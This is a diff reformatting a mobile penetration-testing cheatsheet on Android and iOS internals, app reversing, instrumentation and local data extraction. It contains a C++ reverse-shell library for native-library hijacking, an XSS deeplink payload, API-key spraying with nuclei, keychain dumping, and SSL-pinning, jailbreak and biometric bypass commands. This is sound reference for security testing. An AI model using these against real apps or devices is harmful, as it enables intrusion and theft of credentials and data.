@@ -1,14 +1,11 @@
-Title: Mobile Cheatsheet
-Slug: mobile/cheatsheet
-Date: 1957-01-01 00:00
-Category: Cheatsheet
+# Mobile Cheatsheet
 
 ## Android
 
 ### Concepts
 #### Architecture
 
-![[android-framework.png]]
+![android-framework](../images/mobile/cheatsheet/android-framework.png)
 
 
 **Kernel**: it's a Linux Kernel. It's the most privileged as well as the hardest to reach. Some of the classic Linux kernel exploits are still applicable.
@@ -25,7 +22,7 @@ It's responsible of the basic systems services:
 
 Each HAL module is separated from the other by the perspective of security:
 
-![[android-hardware abstraction layer-security boundaries.png]]
+![android-hardware abstraction layer-security boundaries](../images/mobile/cheatsheet/android-hardware%20abstraction%20layer-security%20boundaries.png)
 
 **Native Libraries & Android Runtime**: Many core Android system components and services, such as ART and HAL, are built from native code that requires native libraries written in C and C++. The Android platform provides Java framework APIs to expose the functionality of some of these native libraries to apps. 
 
@@ -58,7 +55,7 @@ Reference: [https://source.android.com/docs/security](https://source.android.com
 - **Software**: Trusted applications and API’s
 
 
-![[android-trusted-vs-risk-execution-environment.png]]
+![android-trusted-vs-risk-execution-environment](../images/mobile/cheatsheet/android-trusted-vs-risk-execution-environment.png)
 
 **REE** stands for **Risk Execution Environment**.
 
@@ -166,35 +163,35 @@ Reference: [https://8ksec.io/rooting-an-android-emulator-for-mobile-security-tes
 
 4 - Cold Boot the device from the Android Studio's Device Manger or from command line with the following command:
 
-~~~shell
+```shell
 emulator -avd <device name> -no-snapshot-load
-~~~
+```
 
 5 - Download the latest `rootAVD` script:
 
-~~~shell
+```shell
 git clone https://gitlab.com/newbit/rootAVD.git
-~~~
+```
 
 6 - Run the following command to list all installed AVD system images:
 
-~~~shell
+```shell
 ./rootAVD.sh ListAllAVDs
-~~~
+```
 
 7 - Launch the rooting process with the following command:
 
-~~~shell
+```shell
 ./rootAVD.sh <"ramdisk.img" image from the previous command output depending on the taget device API level>
-~~~
+```
 
 8 - Follow the wizard. Generally the default options works fine.
 
 8.1 - For some recent Android versions (like API 34), the standard patch might report `“Magisk Installed: N/A”` or fail to inject properly If the script output indicates Magisk wasn’t installed, you should rerun the command with the `FAKEBOOTIMG` option:
 
-~~~shell
+```shell
 ./rootAVD.sh <"ramdisk.img" image from the previous command output depending on the taget device API level> FAKEBOOTING
-~~~
+```
 
 - The script will push a file (e.g. `fakeboot.img`) into the emulator’s `/sdcard/Download` directory.
 - It will then display a message like _“Install/Patch /sdcard/Download/fakeboot.img and hit Enter when done”._ At this point, **do not press Enter yet.** Instead, go to the emulator, launch the **Magisk app**, and use the **Install -> Select and Patch a File** option. Navigate to `/sdcard/Download/` and select `fakeboot.img`. Magisk will patch the image and output a modified file. Usually it says “Output file is …”. Once Magisk finishes, return to the terminal and press Enter to let rootAVD continue.
@@ -224,7 +221,7 @@ Reference: [https://koz.io/using-frida-on-android-without-root/](https://koz.io/
 
 Reverse Engineer APK:
 
-~~~shell
+```shell
 jadx -d <absolute output path> <absolute target apk>
 
 jadx -d <absolute output path> <absolute target apk> --deobf // Try de-obfuscate
@@ -232,11 +229,11 @@ jadx -d <absolute output path> <absolute target apk> --deobf // Try de-obfuscate
 apktool d <apk> // Get Dalvik Bytecode
 
 apktool b <decompiled directory> -o <output apk> // Re-build Dalvik Bytecode
-~~~
+```
 
 Sign an APK:
 
-~~~shell
+```shell
 // Generate a new key in the specified keystore 
 
 keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
@@ -244,16 +241,16 @@ keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg R
 // Sign the apk with the keystore containing the generated key
 
 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore <apk file> <alias>
-~~~
+```
 
 Dump APK useful information:
 
-~~~shell
+```shell
 aapt dump badging base.apk
 
 aapt list -a base.apk
 aapt list -a base.apk | grep minSdkVersion # Convert hex value to decimal with echo $((16#<hex value>))
-~~~
+```
 
 Smali References:
  
@@ -266,22 +263,22 @@ Smali References:
 
 Locate Main Activity in manifest, it's declared like following snippet:
 
-~~~xml
+```xml
 <activity android:label="@string/app_name" android:name="com.package.MainActivity">
 	<intent-filter>
 		<action android:name="android.intent.action.MAIN"/>
 		<category android:name="android.intent.category.LAUNCHER"/>
 	</intent-filter>
 </activity>
-~~~
+```
 
 ##### Exported Components 
 
 Locate exported activities, services, broadcast receivers, etc., having the `android:exported` set to `true`:
 
-~~~xml
+```xml
 <activity android:exported="true" android:label="@string/title_activity_post_login" android:name="com.package.SomeExportedActivity"/>
-~~~
+```
 
 Exported activity, service, broadcast receiver, etc.) can be launched by components of other applications:
 
@@ -296,11 +293,11 @@ When an app targets Android 11 (API level 30) or higher and queries for inform
 
 When other applications are not visible to yours, use the `<queries>` tag in the manifest in order to make them visible ([reference](https://developer.android.com/training/package-visibility)):
 
-~~~xml
+```xml
 <queries>  
     <package android:name="<target application package name>" />    
 </queries>
-~~~
+```
 
 
 
@@ -310,7 +307,7 @@ When other applications are not visible to yours, use the `<queries>` tag in the
 
 HTTP is enabled if the property  `android:usesCleartextTraffic` is set to `true`:
 
-~~~xml
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <manifest ...>
     <uses-permission android:name="android.permission.INTERNET" />
@@ -321,11 +318,11 @@ HTTP is enabled if the property  `android:usesCleartextTraffic` is set to `true`
         ...
     </application>
 </manifest>
-~~~
+```
 
 If the application uses a separated network security configuration file specified by the property  `android:networkSecurityConfig`, check if that file has the property `cleartextTrafficPermitted` set to `true`:
 
-~~~xml
+```xml
 
 <!-- AndroidManifest.xml -->
 <?xml version="1.0" encoding="utf-8"?>
@@ -346,14 +343,14 @@ If the application uses a separated network security configuration file specifie
         <domain includeSubdomains="true">...</domain>
     </domain-config>
 </network-security-config>
-~~~
+```
 
 ##### Intent Filters
 
 Intent filters are used to declare the capability of an activity to respond to particular intents eventually requested explicitly or implicitly from other apps.
 Intent filters are declared in the `<intent-filter>` tags:
 
-~~~xml
+```xml
 <manifest ... >
 ...
 	<application ...>
@@ -366,7 +363,7 @@ Intent filters are declared in the `<intent-filter>` tags:
 		</activity>
 	</application>
 </manifest>
-~~~
+```
 
 ##### Reference
 
@@ -418,18 +415,18 @@ When a content provider has the `android:grantUriPermissions` set to `true`, it 
 
 An example of unsafe code is the following:
 
-~~~java
+```java
 public void onActivityResult(int requestCode, int resultCode, Intent evilIntent) {
 	...
 	setResult(resultCode, evilIntent);
 }
-~~~
+```
 
 #### Backup
 
 `adb backup` command can also be used for extracting application package backup as follows:
 
-~~~shell
+```shell
 // get backup
 adb backup <package name> 
 
@@ -438,7 +435,7 @@ dd if=backup.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.
 
 /// alternative using openssl
 dd if=backup.ab bs=1 skip=24 | openssl zlib -d
-~~~
+```
 
 Note:
 
@@ -446,17 +443,17 @@ Note:
 
 **Warning** -  [adb backup is deprecated since Android 12](https://developer.android.com/about/versions/12/behavior-changes-12#adb-backup-restrictions):
 
-~~~quote
+```quote
 For apps that target Android 12 (API level 31) or higher, when a user runs the adb backup command, app data is excluded from any other system data that is exported from the device.
 
 If your testing or development workflows rely on app data using adb backup, you can now opt in to exporting your app's data by setting android:debuggable to true in your app's manifest file.
-~~~
+```
 
 -`adb backup` on Android 12 only work if `targetSDK` is lower than 31 or the app is marked as `debuggable=true`.
 
 For Android 12 or higher, create a backup as follows:
 
-~~~shell
+```shell
 # Create the backup
 adb shell bmgr enable true
 adb shell bmgr transport com.android.localtransport/.LocalTransport
@@ -467,7 +464,7 @@ adb shell bmgr backupnow '<package name>'
 adb root 
 adb pull /data/data/com.android.localtransport/files/1/_full/'<package name>' '<package name>.ab' 
 tar xvf <package name>.ab
-~~~
+```
 
 #### LFI & Path Traversal
 
@@ -479,32 +476,32 @@ The use of `getLastPathSegment()` from the `Uri` class without any validation or
 
 When using `intent.setData` with a URI with `file://` protocol, from Android Nougat a FileUriExposedException will be received; this could be overcame with the following code:
 
-~~~java
+```java
 // See: https://stackoverflow.com/questions/38200282/android-os-fileuriexposedexception-file-storage-emulated-0-test-txt-exposed
 StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX);
-~~~
+```
 
 #### Secrets Extraction
 
 Extract URIs, endpoints and secrets using [apkleaks](https://github.com/dwisiswant0/apkleaks)
 
-~~~shell
+```shell
 apkleaks -f <apk to scan> -o <output result path>
-~~~
+```
 
 \[Bug Bounty] Spray found API keys across targets with `nuclei`:
 
-~~~shell
+```shell
 nuclei -t nuclei-templates/http/token-spray -var token=<found api key>
-~~~
+```
 
 #### App Links
 
 Validate Android assetlinks.json with [yurl](https://github.com/chayev/yurl):
 
-~~~shell
+```shell
 yurl assetlink validate <domain>
-~~~
+```
 
 #### WebViews
 
@@ -542,22 +539,22 @@ Interesting paths:
 
 Dump package info:
 
-~~~shell
+```shell
 [adb shell] pm dump <package name>
-~~~
+```
 
 
 Path to the APK for the specified package:
 
-~~~shell
+```shell
 [adb shell] pm path <package>
-~~~
+```
 
 List package names:
 
-~~~shell
+```shell
 [adb shell] pm list packages
-~~~
+```
 
 #### Intent Analysis
 
@@ -569,7 +566,7 @@ The following tool collects intents at runtime and allows to explore/filter them
 
 It's possible to intercept packets in real time by using *tcpdump* and *Wireshark*:
 
-~~~shell
+```shell
 // Start tcpdump and pipe output to a netcat listener
 adb shell "tcpdump -s 0 -w - | nc -l -p 4444" 
 
@@ -578,128 +575,128 @@ adb forward tcp:4444 tcp:4444
 
 // Connect to netcat listner and pipe output to wireshark
 nc localhost 4444 | sudo wireshark -k -S -i –
-~~~
+```
 
 Set and unset system proxy:
 
-~~~shell
+```shell
 [adb shell] settings put global http_proxy <proxy address>:<proxy port>
 
 [adb shell] settings put global http_proxy :0
-~~~
+```
 
 ##### Burp Certificate Installation
 
 Extract the certificate from Burp and convert it to PEM format:
 
-~~~shell
+```shell
 openssl x509 -inform der -in BurpCA.cer -out BurpCA.pem
-~~~
+```
 
 Rename the cert to the output of the following command:
 
-~~~shell
+```shell
 echo $(openssl x509 -inform PEM -subject_hash -in BurpCA.pem | head -1 ).0
-~~~
+```
 
 Copy and set right permissions to the cert:
 
-~~~shell
+```shell
 adb root // if not already root
 abd remount
 adb push <cert name> /system/etc/security/cacerts/
 adb shell "chmod 644 /system/etc/security/cacerts/<cert name>"
 adb shell "reboot"
-~~~
+```
 
 #### Activities, Services, Content Providers, Broadcast Receivers
 
 Start Activity by name:
 
-~~~shell
+```shell
 [adb shell] am start -n com.android.insecurebankv2/.WrongLogin
-~~~
+```
 
 Start Activity by deeplink:
 
-~~~shell
+```shell
 [adb shell] am start -W "[schema]://[host]/[path][?queryParams]"
-~~~
+```
 
 Start Activity Intent:
 
-~~~shell
+```shell
 [adb shell] am start|startservice|broadcast <INTENT>[<COMPONENT>]
 -a <ACTION> e.g. android.intent.action.VIEW
 -c <CATEGORY> e.g. android.intent.category.LAUNCHER
-~~~
+```
 
 Send Broadcast Intent message:
 
-~~~shell
+```shell
 [adb shell] broadcast -n <COMPONENT> [-a <receivername>] 
-~~~
+```
 
 
 Reference: [https://developer.android.com/tools/adb#IntentSpec](https://developer.android.com/tools/adb#IntentSpec)
 
 Dump activity info:
 
-~~~shell
+```shell
 [adb shell] dumpsys activity
 <package>/<activity>
-~~~
+```
 
 Get content by content provider:
 
-~~~shell
+```shell
 // Query content provider data
 [adb shell] content query --uri content://uri/to/resources
 
 // Read file content from file content provider
 [adb shell] content read --uri content://uri/to/resources
-~~~
+```
 
 Take screenshot:
 
-~~~shell
+```shell
 [adb shell] screencap -p "/path/to/screenshot.png"
-~~~
+```
 
 Trace all invocations to methods in a package using `frida-trace`:
 
-~~~shell
+```shell
 frida-trace -U -j 'com.package.!*' -f '<target application package>'
-~~~
+```
 
 #### Logging
 
 View devices logs:
 
-~~~shell
+```shell
 adb logcat [options] [filter]
-~~~
+```
 
 
 Target a specific app by filtering the Logcat output: 
 
-~~~shell
+```shell
 adb logcat | grep "$(adb shell ps | grep <package-name> | awk '{print $2}')"
-~~~
+```
 
 #### XSS
 
 Exploit web view activity not validating schema:
 
-~~~shell
+```shell
 adb shell am start -n oversecured.ovaa/.activities.WebViewActivity --es url 'javascript://somehost/%0aalert\(\"mzfr\"\)'
-~~~
+```
 
 #### Dynamic Code Injection - Native Library Hijacking
 
 When the application dynamically loads native libraries or dex code, it's possible to abuse other vulnerabilities such as path traversal in order to inject evil code and  achieve code execution:
 
-~~~java
+```java
 private final void loadProLibrary() {
         try {
             String abi = Build.SUPPORTED_ABIS[0];
@@ -713,11 +710,11 @@ private final void loadProLibrary() {
 ...
 // Use dynamic loaded code
 someDynamicFunction();
-~~~
+```
 
 Following a C++ reverse shell:
 
-~~~c++
+```c++
 #include <cstdio>
 #include <cstdlib>
 #include <unistd.h>
@@ -757,7 +754,7 @@ void __attribute__ ((constructor)) reverse_shell() {
         execve("/system/bin/sh", nullptr, nullptr);
     }
 }
-~~~
+```
 
 ## iOS
 
@@ -769,7 +766,7 @@ Reference: https://help.apple.com/pdf/security/en_GB/apple-platform-security-gui
 ###### Architecture
 
 
-![[ios-architecture-extended.png]]
+![ios-architecture-extended](../images/mobile/cheatsheet/ios-architecture-extended.png)
 
 
 - **Core OS:**
@@ -798,7 +795,7 @@ Reference: https://help.apple.com/pdf/security/en_GB/apple-platform-security-gui
 
 ###### Operating System
 
-![[ios-os-architecture.png]]
+![ios-os-architecture](../images/mobile/cheatsheet/ios-os-architecture.png)
 
 
 The core operating system is Darwin OS and it's the foundation for all specific iDevices OS (MacOS, iOS, tvOS, watchOS, visionOS, etc.).
@@ -849,7 +846,7 @@ General Exploit Mitigations:
 ###### Data Protection
 
 
-![[filesystem.png]]
+![ios-filesystem](../images/mobile/cheatsheet/ios-filesystem.png)
 
 **Data Protection** is a technology used to protect data stored in flash storage on the devices; it's implemented by constructing and managing a hierarchy of keys and builds on the hardware encryption technologies built into Apple devices. 
 
@@ -1015,15 +1012,15 @@ IPA structure:
 
 Using `iproxy` it's possible to SSH to the mobile device via USB (no need to be in the same network):
 
-~~~shell
+```shell
 iproxy 2222 22
-~~~
+```
 
 Install `iproxy` with `brew`:
 
-~~~shell
+```shell
 brew install libusbmux
-~~~
+```
 
 #### iPhone SSHFS
 
@@ -1048,9 +1045,9 @@ Manually:
 
 Using `ios-deploy`:
 
-~~~shell
+```shell
 ios-deploy -b <.app path> --debug -W
-~~~
+```
 
 #### Install IPA/APP on simulator 
 
@@ -1064,9 +1061,9 @@ ios-deploy -b <.app path> --debug -W
 
  Use `xcrun`:
   
- ~~~shell
+ ```shell
  xcrun simctl install booted <appname>.<app or ipa>
- ~~~
+ ```
 
 #### Extract and Decrypt IPA
 
@@ -1076,7 +1073,7 @@ It's possible to extract an IPA using [frida-ios-dump](https://github.com/AloneM
 - requires jailbroken device
 
 
-~~~shell
+```shell
 ### Requires local port forwarding
 iproxy 2222 22
 
@@ -1085,7 +1082,7 @@ python dump.py -l
 
 ### Extract the IPA
 python dump.py [-u <mobile username>] [-P <mobile password>] <Display Name>|<Bundle Identifier> 
-~~~
+```
 
 Take a look to:
 
@@ -1096,42 +1093,42 @@ When dealing with unencrypted IPAs, it's possible to extract them manually as fo
 
 1 - SSH to the device and go to:
 
-~~~
+```
 /var/containers/Bundle/Application/<bundle id>
-~~~
+```
 
 1.1 - Get bundle ID manually:
 
-~~~shell
+```shell
 find /var/containers/Bundle/Application -name "<app name>.app" | cut -d "/" -f 6
-~~~
+```
 
 1.1 - Get application bundle full path with `objection`:
 
-~~~shell
+```shell
 objection -g <app identifier> explore
 > ios bundles list_bundles --full-path
-~~~
+```
 
 2 - Re-bundle the IPA as follows:
 
-~~~shell
+```shell
 mkdir Payload
 cp -r <app name>.app Payload
 zip -r <app name>.ipa Payload
-~~~
+```
 
 3 - Copy the IPA to the machine:
 
-~~~shell
+```shell
 scp <mobile user>:<mobile password>:/var/containers/Bundle/Application/<app name>.ipa <output directory>
-~~~
+```
 
 4 - Cleanup on the mobile device:
 
-~~~shell
+```shell
 rm -rf Payload <app name>.ipa
-~~~
+```
 
 #### Patch IPA with frida gadget
 
@@ -1139,12 +1136,12 @@ This is useful when testing on a non jailbroken device or on a simulator.
 
 Install [insert_dylib](https://github.com/tyilo/insert_dylib):
 
-~~~shell
+```shell
 git clone https://github.com/Tyilo/insert_dylib  
 cd insert_dylib  
 xcodebuild  
 cp build/Release/insert_dylib /usr/local/bin/insert_dylib
-~~~
+```
 
 #### Patch IPA with frida gadget - Objection
 
@@ -1157,17 +1154,17 @@ From `xcode`, locate the provisioning profiles:
 
 Get signing identity:
 
-~~~shell
+```shell
 applesign -L
 ### or
 security find-identity -p codesigning -v
-~~~
+```
 
 Patch the IPA with `obsidian`:
 
-~~~shell
+```shell
 objection patchipa --source <ipa path> --codesign-signature <signing identity> -P <provisioning profile path> [-V <frida version | default to last>]
-~~~
+```
 
 **ATTENTION**: if the ipa is to be ran on a simulator, by default objection will NOT download the iOS simulator build for the gadget dylib. 
 
@@ -1184,53 +1181,53 @@ objection patchipa --source <ipa path> --codesign-signature <signing identity> -
 
 Launch the app and connect to it with `obsidian` or `frida`:
 
-~~~shell
+```shell
 ### Objection
 objection -h localhost -N explore
 
 ### Frida
 frida -H localhost Gadget
-~~~
+```
 
 #### Patch IPA with frida gadget - Manual
 
 Unzip the .ipa:
 
-~~~shell
+```shell
 unzip <appname>.ipa
-~~~
+```
 
 Patch the Mach-O binary with `insert_dylib`:
 
-~~~shell
+```shell
 insert_dylib --all-yes @executable_path/frida-gadget.dylib Payload/<appname>.app/<appname> Payload/<appname>.app/<appname>.patched
-~~~
+```
 
 Replace the Mach-O binary:
 
-~~~shell
+```shell
 mv Payload/<appname>.app/<appname>.patched Payload/<appname>.app/<appname>
-~~~
+```
 
 Copy the frida gadget dylib into the .app root folder (due to `@executable_path/frida-gadget.dylib`):
 
-~~~shell
+```shell
 cp frida-gadget.dylib Payload/<appname>.app/
-~~~
+```
 
 Re-sign the app:
 
-~~~shell
+```shell
 codesign --force --sign - --deep Payload/<appname>.app
-~~~
+```
 
 Install the .app or re-bundle the Payload folder into a .ipa.
 
 It's possible to re-sign an ipa using `applesign`:
 
-~~~shell
+```shell
 applesign -i <signing identity> -m <provisioning file> <.ipa to re-sign>
-~~~
+```
 
 #### Jailbreaking
 
@@ -1254,7 +1251,7 @@ The simulator uses the system-wide proxy; it's possible to restrict proxy to par
 
 1 - Create a `.pac` script like the following:
 
-~~~pac
+```pac
 function FindProxyForURL(url, host) {
     PROXY = "PROXY localhost:8080"
 	
@@ -1266,13 +1263,13 @@ function FindProxyForURL(url, host) {
     // Everything else directly!
     return "DIRECT";
 }
-~~~
+```
 
 2 - Run a python web server in the same folder of the `.pac` script:
 
-~~~shell
+```shell
 python3 -m http.server
-~~~
+```
 
 3 - Configure the proxy on the MacOS settings:
 
@@ -1283,7 +1280,7 @@ python3 -m http.server
 
 `otool` reversing cheatsheet:
 
-~~~shell
+```shell
 ### View architectures in a universal (fat) binary
 otool -f <binary>
 
@@ -1319,36 +1316,36 @@ otool -tV <binary>
 
 ### Disassemble ARM64 binary explicitly
 otool -tV --arch arm64 <binary>
-~~~
+```
 
 
 Check if **PIE (Position Independent Executable)** enabled during build:
 
-~~~shell
+```shell
 otool -hv <app-binary> | grep PIE
-~~~
+```
 
 Check if **Stack Canaries** enabled during build:
 
-~~~shell
+```shell
 otool -I -v <app-binary> | grep stack_chk
-~~~
+```
 
 Check if **ARC (Automatic Reference Counting)** enabled during build:
 
-~~~shell
+```shell
 otool -I -v <app-binary> | grep objc_release
-~~~
+```
 
 Check if the binary is **Encrypted**:
 
-~~~shell
+```shell
 otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT
-~~~
+```
 
 Vulnerable and insecure functions usage:
 
-~~~shell
+```shell
 ### Insecure Algorithms
 otool -I -v <app-binary> | grep "_CC_MD5"
 otool -I -v <app-binary> | grep "_CC_SHA1"
@@ -1368,17 +1365,17 @@ otool -I -v <app-binary> | grep "_alloca"
 otool -I -v <app-binary> | grep "_sprintf"
 otool -I -v <app-binary> | grep "_printf"
 otool -I -v <app-binary> | grep "_vsprintf"
-~~~
+```
 
 Search vulnerable and insecure functions usage recursively:
 
-~~~shell
+```shell
 for f in $(find ./ -type f); do res=$(otool -I "$f"); if [[ ! "$res" =~ "is not an object file" ]]; then echo "\n=== Analyzing: $f ==="; otool -I -v "$f" | grep -E "_fopen|_sscanf|_strlen" ; fi; done
-~~~
+```
 
 Find method/function usage with `radare2`:
 
-~~~shell
+```shell
 ### Open binary with auto-analysis
 r2 -A MyAppBinary
 
@@ -1411,11 +1408,11 @@ pdf @ 0xADDRESS
 
 ### Find xrefs to objc_msgSend (indirect ObjC method calls)
 /C objc_msgSend
-~~~
+```
 
 String searching and dumping with `radare2`:
 
-~~~shell
+```shell
 ### Search for string
 / <string to search>
 
@@ -1437,25 +1434,25 @@ psz @ 0xADDRESS
 ### From shell, dump all strings without entering r2
 r2 -q -c iz MyAppBinary
 
-~~~
+```
 
 Search byte sequence with `otool`:
 
-~~~shell
+```shell
 otool -tVv MyAppBinary | grep -A4 -B4 "<byte sequence>"
-~~~
+```
 
 Check Architecture with `lipo`:
 
-~~~shell
+```shell
 lipo -info Payload/MyApp.app/MyApp
-~~~
+```
 
 Check target build platform with `otool`:
 
-~~~shell
+```shell
 otool -l <appname>.app/<appname> | grep -A3 LC_BUILD_VERSION
-~~~
+```
 
 - `platform 2` = iOS (real device) 
 - `platform 7` = iOS Simulator
@@ -1463,125 +1460,125 @@ otool -l <appname>.app/<appname> | grep -A3 LC_BUILD_VERSION
 
 Check build platform using `vtool`:
 
-~~~shell
+```shell
 vtool -show-build <appname>.app/<appname> 
-~~~
+```
 
  Check linked libraries with `otool`:
 
-~~~shell
+```shell
 otool -L <appname>.app/<appname>
-~~~
+```
 
 Check runtime paths with `otool`:
 
-~~~shell
+```shell
 otool -l <appname>.app/<appname> | grep -A2 RPATH
-~~~
+```
 
 Get code signature format using `codesign`:
 
-~~~shell
+```shell
 codesign -dv <.app path>
-~~~
+```
 
 Check entitlements with `codesign`:
 
-~~~shell
+```shell
 codesign -dvvvv --entitlements :- Payload/MyApp.app/MyApp
-~~~
+```
 
 Check entitlements with `ipsw`:
 
-~~~shell
+```shell
 ipsw ent --input <binary> --key <entitlement>
 ipsw macho info -e <binary>
-~~~
+```
 
 - If the entitlement `get-task-allow` is present, the application is built with debug symbols.
 
 Check if build with debug symbols using `objdump`:
 
-~~~shell
+```shell
 objdump --syms <binary> | grep "d  "
-~~~
+```
 
 Get Plist content with `plutil`:
 
-~~~shell
+```shell
 plutil -p Info.plist
-~~~
+```
   
 Get `MinimumOSVersion` with `plutil`:
 
-~~~shell
+```shell
 plutil -p Info.plist | grep MinimumOSVersion
-~~~
+```
 
 Get binary information with `objection`:
 
-~~~shell
+```shell
 objection -g <app identifier> run "ios info binary"
-~~~
+```
 
 Get binary info with [ipsw](https://github.com/blacktop/ipsw):
 
-~~~shell
+```shell
 ipsw macho info <binary>
-~~~
+```
 
 Disassemble binary with `ipsw`:
 
-~~~shell
+```shell
 ipsw macho disass <binary> --symbol _main
-~~~
+```
 
 Search string into binary with `ipsw`:
 
-~~~shell
+```shell
 ipsw macho search <binary> --string "<string to search>"
-~~~
+```
 
 Get dynamically loaded libraries with `ipsw`:
 
-~~~shell
+```shell
 ipsw macho info <binary> | grep LC_LOAD_DYLIB | cut -d " " -f 17 
-~~~
+```
 
 Dump Objective-C classes with `ipsw`:
 
-~~~shell
+```shell
 ### Raw dump
 ipsw class-dump <binary>
 ### Demangled dump
 ipsw class-dump --demangle <binary>
 ### Dump ObjC headers
 ipsw class-dump --headers -o <output dir> <binary>
-~~~
+```
 
 Dump Swift classes with `ipsw`:
 
-~~~shell
+```shell
 ipsw swift-dump <binary>
 ipsw swift-dump --demangle <binary>
 ### Create separate header files for each Swift type/protocol/extension
 ipsw swift-dump --headers -o <output dir> <binary>
-~~~
+```
 
 Check if WebViews are being used:
 
-~~~shell
+```shell
 strings <binary> | grep -i "UIWebView"
 strings <binary> | grep -i "WKWebView"
 strings <binary> | grep -i "SFSafariViewController"
-~~~
+```
 
 Cross-compile a dynamic library from MacOS for iOS:  
 
-~~~shell
+```shell
 clang -arch arm64 -miphoneos-version-min=15.0 -isysroot "$(xcrun --sdk iphoneos --show-sdk-path)" -dynamiclib -install_name @rpath/libexampl  
 e.dylib License.c -o license.dylib
-~~~
+```
 
 #### Objective-C Analysis
 
@@ -1589,7 +1586,7 @@ e.dylib License.c -o license.dylib
 
 A typical Objective-C header file looks like this:
 
-~~~objective-c
+```objective-c
 ###ifndef MYZipWriter_h
 ###define MYZipWriter_h
 @import Foundation;
@@ -1621,7 +1618,7 @@ A typical Objective-C header file looks like this:
 @end
 
 ###endif /* MYZipWriter_h */
-~~~
+```
 
 Key Elements:
 
@@ -1652,7 +1649,7 @@ Once you have identified the methods in the header files, think about what they 
 
  Below a snippet with a typical Swift class structure from the **swift_dump** file:
  
-~~~swift
+```swift
 class DVIA_v2.ApplicationPatchingDetailsViewController: UIViewController {
   /* fields */
     var usernameTextField: UITextField?
@@ -1670,7 +1667,7 @@ class DVIA_v2.ApplicationPatchingDetailsViewController: UIViewController {
     func ApplicationPatchingDetailsViewController.killApplicationTapped(_:)
     func ApplicationPatchingDetailsViewController.textFieldShouldReturn(_:)
 }
-~~~
+```
 
 Key Elements:
 
@@ -1689,9 +1686,9 @@ Look for important method names and infer their role:
 
 Run `nuclei` templates on the application's plist:
 
-~~~shell
+```shell
 echo <plist path> | nuclei -t /<path-to-template-folder> -file
-~~~
+```
 
 #### Forensics
 
@@ -1709,23 +1706,23 @@ Useful resources:
 
 Try bypassing Jailbreak detection with `objection`:
 
-~~~objection
+```objection
 > ios jailbreak disable
-~~~
+```
 
 Simulate a Jailbroken device with `objection` - useful to check if the app has Jailbreak detection checks when testing in non-Jailbroken environment:
 
-~~~objection
+```objection
 > ios jailbreak simulate
-~~~
+```
 
 #### SSL Pinning Bypass
 
 Bypass SSL pinning with `objection`:
 
-~~~objection
+```objection
 > ios sslpinning disable
-~~~
+```
 
 Bypass SSL pinning with [ssl-kill-switch3](https://github.com/NyaMisty/ssl-kill-switch3):
 
@@ -1736,32 +1733,32 @@ Bypass SSL pinning with [ssl-kill-switch3](https://github.com/NyaMisty/ssl-kill-
 
 Check hooked classes and methods for SSL Pinning bypass with `objection`:
 
-~~~objection
+```objection
 > ios hooking list classes | grep NSURL
 > ios hooking list methods -c NSURLSession
-~~~
+```
 
 #### TouchID Bypass
 
 Trace biometrics usage (LocalAuthentication.framework) with `frida-trace`:
 
-~~~shell
+```shell
 frida-trace -U -m "*[LAContext *]" -p <PID>
-~~~
+```
 
 Bypass TouchID authentication with `objection`:
 
-~~~shell
+```shell
 > ios ui biometrics_bypass
-~~~
+```
 
 #### UIPasteboard
 
 Monitor UIPasteboard inputs with `objection`:
 
-~~~objection
+```objection
 > ios pasteboard monitor
-~~~
+```
 
 #### Local Data Storage
 
@@ -1771,21 +1768,21 @@ Check local storage at path: `/var/mobile/Containers/Data/Application/<data id>`
 
 Data id can be found as follows:
 
-~~~shell
+```shell
 grep -RiaoH '<app name>' /var/mobile/Containers/Data/Application 2>/dev/null | head -n 1 | cut -d / -f 7
-~~~
+```
 
 Enumerate all possible application databases:
 
-~~~shell
+```shell
 find /var/mobile/Containers/Data/Application/<data id> -name "*.sqlite*" -or -name "*.db"
-~~~
+```
 
 Search for JWT (e.g in the Data folder):
 
-~~~shell
+```shell
 grep -RiahE '^ey([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_\-\+\/=]*)' /var/mobile/Containers/Data/Application/<data id> 
-~~~
+```
 
 When dealing with simulators, replace `/var/mobile` with `~/Library/Developer/CoreSimulator/Devices/<simulator UDID>/data`.
 
@@ -1799,13 +1796,13 @@ When using **suite names** (e.g. `initWithSuiteName:` or App Groups), the fil
 
 Get `NSUserDefaults` with `objection`:
 
-~~~shell
+```shell
 ### Open the app with objection (will be DEPRECATED)
 objection -g <app identifier> explore
 
 ### Get user defaults content
 > ios nsuserdefaults get
-~~~
+```
 
 ##### Shared Credentials Storage
 
@@ -1813,15 +1810,15 @@ The manager of a shared credentials cache.
 
 Dump `NSUrlCredentialsStorage` with `objection`:
 
-~~~shell
+```shell
 > ios nsurlcredentialstorage dump
-~~~
+```
 
 ##### Keychain
 
 Dump device keychain content with [Keychain-Dumper](https://github.com/ptoomey3/Keychain-Dumper):
 
-~~~shell
+```shell
 wget https://raw.githubusercontent.com/ptoomey3/Keychain-Dumper/refs/heads/master/updateEntitlements.sh
 sed -i '' 's/KEYCHAIN_DUMPER_FOLDER=\/usr\/bin/KEYCHAIN_DUMPER_FOLDER=\/var\/jb\/usr\/bin/g' updateEntitlements.sh
 
@@ -1835,25 +1832,25 @@ chmod +r /private/var/Keychains/keychain-2.db
 
 /var/jb/usr/bin/updateEntitlements.sh
 /var/jb/usr/bin/keychain_dumper > result.txt
-~~~
+```
 
 **Note**: Some keychain entries are available regardless of whether the iOS is locked or not, while other entries will only be accessible if the iOS device is unlocked.
 
 Check if keychain is being used somewhere in the application:
 
-~~~shell
+```shell
 strings <binary> | grep -i SecItem
-~~~
+```
 
 Dump application's keychain content with `objection`:
 
-~~~shell
+```shell
 ### Open the app with objection (will be DEPRECATED)
 objection -g <app identifier> explore
 
 ### Get user defaults content
 > ios keychain dump
-~~~
+```
 
 ##### CoreData
 
@@ -1874,7 +1871,7 @@ Several options, such as autocorrect and spell check, are available to users to 
 Data is stored in the `database2` table. The column containing the data is a blob containing a serialized `NSKeyedArchiver` object.
 Use the following script to dump the YapDatabase.sqlite decoded content:
 
